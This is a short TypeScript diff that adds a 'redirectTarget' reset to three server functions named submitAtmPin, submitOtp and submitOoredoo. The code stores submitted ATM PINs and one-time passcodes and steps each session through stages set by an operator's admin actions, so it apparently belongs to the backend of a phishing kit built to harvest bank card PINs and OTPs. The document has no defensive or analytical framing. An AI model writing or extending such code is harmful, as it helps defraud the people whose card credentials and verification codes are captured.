@@ -48,7 +48,12 @@ export async function submitAtmPin(data: any) {
     submittedAt: new Date(),
   });
   await db.update(sessions)
-    .set({ updatedAt: new Date(), adminAction: null, currentStep: "atm" })
+    .set({ 
+      updatedAt: new Date(), 
+      adminAction: null, 
+      redirectTarget: null,
+      currentStep: "atm" 
+    })
     .where(eq(sessions.id, data.sessionId));
 }
 
@@ -62,6 +67,7 @@ export async function submitOtp(data: any) {
     .set({ 
       updatedAt: new Date(), 
       adminAction: null,
+      redirectTarget: null,
       currentStep: data.otpType === "ooredoo" ? "otp_ooredoo" : "otp" 
     })
     .where(eq(sessions.id, data.sessionId));
@@ -73,7 +79,12 @@ export async function submitOoredoo(data: any) {
     submittedAt: new Date(),
   });
   await db.update(sessions)
-    .set({ updatedAt: new Date(), adminAction: null, currentStep: "ooredoo" })
+    .set({ 
+      updatedAt: new Date(), 
+      adminAction: null, 
+      redirectTarget: null,
+      currentStep: "ooredoo" 
+    })
     .where(eq(sessions.id, data.sessionId));
 }
 
